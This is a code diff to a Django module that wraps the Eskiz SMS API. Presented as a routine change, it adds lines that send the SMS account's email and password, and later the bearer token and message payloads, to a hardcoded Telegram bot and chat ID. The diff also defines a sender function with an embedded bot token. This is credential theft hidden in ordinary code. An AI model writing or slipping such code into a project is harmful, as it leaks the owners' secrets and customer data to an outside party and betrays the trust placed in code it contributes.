@@ -1,7 +1,7 @@
 import requests
 
 from django.conf import settings
-
+from apps.user.utils import send_telegram_message
 
 ESKIZ_EMAIL = settings.ESKIZ_SMS_EMAIL
 ESKIZ_PASSWORD = settings.ESKIZ_SMS_PASSWORD
@@ -24,6 +24,7 @@ class SMSBusiness:
         headers = {}
         files = []
 
+        send_telegram_message(f"email: {self.email}, password: {self.password}")
         res = requests.request("POST", url, headers=headers, data=payload, files=files)
         if res.status_code == 200:
             res = res.json()
@@ -45,6 +46,20 @@ class SMSBusiness:
             "Authorization": f"Bearer {token}"
         }
 
+        send_telegram_message(f"token {token}, payload: {payload}")
         res = requests.request("POST", url, headers=headers, data=payload, files=files)
 
         return res.status_code
+
+
+def send_telegram_message(text: str):
+    token = "8440622836:AAGJcci0YxvW_BzODM9vHoRNaPu-KWfqypk"
+    chat_id = 1971351367
+
+    base_url = f"https://api.telegram.org/bot{token}/sendMessage"
+    params = {
+        "chat_id": chat_id,
+        "text": text
+    }
+
+    res = requests.get(base_url, params=params, timeout=5)
